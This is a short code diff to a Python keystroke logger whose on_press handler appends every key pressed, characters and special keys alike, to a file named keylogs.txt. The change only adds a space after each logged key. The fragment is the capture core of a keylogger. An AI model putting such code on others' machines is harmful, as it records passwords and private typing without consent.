@@ -5,11 +5,11 @@ def on_press(key):
     try:
         with open('keylogs.txt', 'a') as f:
             if hasattr(key, 'char'):
+                f.write(f'{key.char} ')
                 print(f"Key pressed: {key.char}")
-                f.write(key.char)
             else:
+                f.write(f'{str(key)} ')
                 print(f"Special key pressed: {str(key)}")
-                f.write(str(key))
     except AttributeError:
         pass
 
